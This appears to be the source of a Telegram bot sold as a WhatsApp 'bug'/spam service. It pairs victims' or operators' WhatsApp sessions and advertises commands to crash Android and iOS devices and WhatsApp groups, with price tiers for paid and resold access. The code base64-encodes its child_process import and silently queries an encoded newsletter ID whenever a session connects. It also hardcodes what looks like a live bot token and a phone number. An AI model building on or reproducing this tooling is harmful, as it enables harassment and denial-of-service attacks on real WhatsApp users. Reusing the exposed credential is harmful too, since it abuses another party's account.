process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "918293007159"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")
const { log } = require("@sabir7718/log")

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const {
    spawn
} = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();
const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: '📢 Join Channel',
                url: config.channel
            }],
            [{
                text: '📱 Follow WhatsApp',
                url: config.waChannel || 'https://whatsapp.com'
            }],
            [{
                text: '✅ Check Membership',
                callback_data: 'check_membership'
            }]
        ]
    }
};

const protectionMessage = `❌ You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
    if (userId.toString() === adminId.toString()) return true;
    if (!chId && !grId) return true;
    try {
        let inChannel = true;
        let inGroup = true;
        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];

        if (chId) {
            const channelMember = await botInstance.getChatMember(chId, userId);
            inChannel = validStatuses.includes(channelMember.status);
        }

        if (grId) {
            const groupMember = await botInstance.getChatMember(grId, userId);
            inGroup = validStatuses.includes(groupMember.status);
        }

        return inChannel && inGroup;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message);
        return true;
    }
}

const notauthorized = '🚫 You are not authorized to use this command.';

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return {
        tokens: [],
        premium: [],
        resellers: []
    };

    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);

        if (Array.isArray(parsed)) {
            return {
                tokens: parsed,
                premium: [],
                resellers: []
            };
        }

        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return {
            tokens: [],
            premium: [],
            resellers: []
        };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Dam:</b>\n` +
        `✅ <b>Permanent Access</b>: 15$ | ₹1,500\n` +
        `✅ <b>Permanent Resell</b>: 30$ | ₹3,000\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 100$ | ₹10,000`, {
            parse_mode: 'HTML'
        }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: 'I| Bug Menu',
                callback_data: 'bug_menu'
            }, {
                text: 'I| Misc Menu',
                callback_data: 'misc_menu'
            }],
            [{
                text: 'I| Channel ↗',
                url: `${config.channel}`
            }]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {}
}

async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
    let authPath;
    if (ownerId) {
        authPath = `./Love/${ownerId}/Auths/${number}`;
    } else {
        authPath = `./Love/auth/${chatId}/${number}`;
    }

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, {
            recursive: true
        });
    }

    const msgRetryCounterCache = new NodeCache();
    let {
        version
    } = await fetchLatestBaileysVersion();
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({
            level: 'silent'
        }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }).child({
                level: "fatal"
            })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            return { conversation: 'Hello' };
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `SEXYXEON`);
            await S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀ𝗶𝗻𝗴 ᴄᴏ𝗱𝗲 : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, {
                parse_mode: 'HTML'
            });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            try {
                await SYLoveMeOk(SYxS7);
            } catch (e) {}
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({
                sock: SYxS7,
                num: number
            });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});

                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, {
                    recursive: true,
                    force: true
                });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true);
                    await delay(3000);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`, {
                    parse_mode: 'HTML'
                }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) {
        return 'Owner';
    }
    if (db.resellers.includes(love.toString())) {
        return 'Reseller';
    }
    if (db.premium.includes(love.toString())) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love, SABIR7718, SABANA) {
    const status = GetSYLoVe(love);
    return `┌──────┤ ${SABIR7718} ├──────┐\n│➻ Name: ${name}\n│➻ Developer: ${SABANA}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇ𝒕 : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, {
            polling: true
        });
        let db = getDB();
        let tokenData = db.tokens.find(t => t.token === token);
        let SABIR7718;

        let botConfig = {
            channel: config.channel,
            group: config.group,
            logo: LoveLogo,
            botName: "Ϟ 𝙕⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
            ownerContact: config.S7,
            protection: false,
            channelId: config.channelId,
            groupId: config.groupId
        };

        if (tokenData && tokenData.config) {
            if (tokenData.config.channel) botConfig.channel = tokenData.config.channel;
            if (tokenData.config.group) botConfig.group = tokenData.config.group;
            if (tokenData.config.logo) botConfig.logo = tokenData.config.logo;
            if (tokenData.config.botName) botConfig.botName = tokenData.config.botName;
            if (tokenData.config.ownerContact) botConfig.ownerContact = tokenData.config.ownerContact;
            if (tokenData.config.protectionState !== undefined) botConfig.protection = tokenData.config.protectionState;
            if (tokenData.config.channelId) botConfig.channelId = tokenData.config.channelId;
            if (tokenData.config.groupId) botConfig.groupId = tokenData.config.groupId;
        }

        const botOwnerId = tokenData ? tokenData.owner : config.adminId;
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === "8590832673:AAF9YcCnbb2OcPZ11iCZ3bQ_scN-2O0q324") {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function VOIDSEC() {
            return {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '📢 Join Channel',
                            url: botConfig.channel
                        }],
                        [{
                            text: '👥 Join Group',
                            url: botConfig.group
                        }],
                        [{
                            text: '📱 Follow WhatsApp',
                            url: config.waChannel || 'https://whatsapp.com'
                        }],
                        [{
                            text: '✅ Check Membership',
                            callback_data: 'check_membership'
                        }]
                    ]
                }
            };
        }

        SABIR7718 = {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'I| Bug Menu',
                        callback_data: 'bug_menu'
                    }, {
                        text: 'I| Misc Menu',
                        callback_data: 'misc_menu'
                    }],
                    [{
                        text: 'I| Channel ↗',
                        url: `${botConfig.channel}`
                    }]
                ]
            }
        };

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];

            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);

                if (commands.includes(cmd)) {
                    const chatId = msg.chat.id;
                    const userId = msg.from.id;

                    if (botConfig.protection && cmd !== 'checkmembership') {
                        const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                        if (!isMember) {
                            const protectMsg = `❌ <b>Access Denied!</b>\n\nYou must join our Channel & Group to use this bot.\n\n👤 <b>Owner:</b> ${botConfig.ownerContact}\nClick "Check Membership" after joining.`;

                            return S7.sendMessage(chatId, protectMsg, {
                                parse_mode: 'HTML',
                                ...VOIDSEC()
                            });
                        }
                    }

                    try {
                        const name = msg.from.first_name || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                    }
                }
            });
        }

        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();
            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }
            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({
                    id: chatId,
                    name: name,
                    date: new Date().toLocaleString()
                });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }

            const love = msg.from.id.toString();
            const captionText = `┌──────┤ Ϟ 𝙕⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ ├──────┐\n│➻ Name: ${name}\n│➻ Developer: ${botConfig.ownerContact}\n│➻ Status: ${GetSYLoVe(love)}\n│➻ Online: ${uptime}\n└──────────────────────┘\n┌──────┤ Press Button Menu ├──────┐\n└────────────────────────┘`;

            S7.sendPhoto(chatId, botConfig.logo, {
                caption: captionText,
                ...SABIR7718
            }).catch(() => {
                S7.sendMessage(chatId, captionText, SABIR7718);
            });
        });

        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

            if (isMember) {
                S7.sendMessage(chatId, `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, {
                    parse_mode: 'HTML'
                });
            } else {
                S7.sendMessage(chatId, protectionMessage, {
                    parse_mode: 'HTML',
                    ...SYLovesButton
                });
            }
        });

        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            let db = getDB();
            let currentBotTokenObj = db.tokens.find(t => activeBots[t.token] === S7);
            let ownerID = null;
            if (currentBotTokenObj) {
                ownerID = currentBotTokenObj.owner;
            }
            await StartLovingSY(chatId, cleanNumber, S7, false, ownerID);
        });

        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const love = userId.toString();
            const S7edit = (text, opts) => {
                S7.editMessageCaption(text, opts).catch((err) => {
                    if (!err.message.includes('message is not modified')) {
                        log('error', 'SYSTEM', err.message);
                    }
                });
            };

            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
                        `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };

            if (data === 'misc_menu') {
                const chatId = query.message.chat.id;
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const miscText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `
┌──────┤ Misc Menu ├──────┐
│➻ reqpair number
│➻ delpair number
│➻ addprem ID
│➻ delprem ID
│➻ addresell ID
│➻ delresell ID
│➻ addtoken token
│➻ deltoken token
│➻ listprem
│➻ listresell
│➻ listuser
│➻ mytoken 
│➻ state 0 | 1
└──────────────────────┘
┌──────┤ Make Your Bot ├──────┐
│➻ /addbot  – Create a new bot
│➻ /delbot  – Delete an existing bot
│➻ /setbot  – Customize / configure your bot
└────────────────────────┘
                `;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, ...SABIR7718 });
            }

            if (data === 'bug_menu') {
                const chatId = query.message.chat.id;
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const bugText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `
┌──────┤ Bug Android ├──────┐
│➻ crashjam num time
│➻ trashsystem num time
│➻ crashdroid num time
│➻ killsystem num time
│➻ forceblock num|amount
└──────────────────────┘
┌──────┤ Bug iOS ├──────┐
│➻ hidenseek number time
│➻ iosinvisible number time
└──────────────────────┘
┌──────┤ Bug Group ├──────┐
│➻ trashsysgp groupid time
│➻ xgroup groupid time
│➻ killgc groupid time
│➻ groupfriz groupid time
│➻ groupui groupid time
│➻ listgc
│➻ groupid link
└──────────────────────┘
                `;
                S7edit(bugText, { chat_id: chatId, message_id: messageId, ...SABIR7718 });
            }

            if (data.startsWith('copy_jid_')) {
                const jid = data.replace('copy_jid_', '');
                await S7.answerCallbackQuery(query.id, {
                    text: 'JID copied to clipboard!',
                    show_alert: false
                });
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Iniciar o Bot Principal com o Token Fornecido
startSYloveBot("8590832673:AAF9YcCnbb2OcPZ11iCZ3bQ_scN-2O0q324");

// Iniciar Bots Extras a partir da Base de Dados
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
        startSYloveBot(obj.token);
    });
} else {
    log('info', null, 'No extra bots found in database.');
}
